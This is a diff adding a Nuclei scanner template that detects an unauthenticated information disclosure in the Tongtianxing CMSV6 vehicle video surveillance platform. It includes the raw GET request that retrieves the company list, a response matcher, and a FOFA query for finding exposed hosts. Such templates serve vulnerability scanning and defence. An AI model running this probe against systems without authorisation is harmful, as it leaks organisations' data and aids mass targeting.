@@ -1,0 +1,29 @@
+id: gsky-cmsv6-StandardApiAction-findCompanyList-disclosure
+info:
+  name: 通天星 CMSV6 车载视频监控平台 StandardApiAction_findCompanyList.action - 信息泄露
+  author: leadlife
+  severity: medium
+  description: 
+  reference: 
+    - 
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="./open/webApi.html"||body="/808gps/"
+  tags: g-sky,disclosure
+
+
+http:
+  - raw:
+      - |
+        GET /StandardApiAction_findCompanyList.action HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: text/xml; charset=utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"companys","result","companyName")
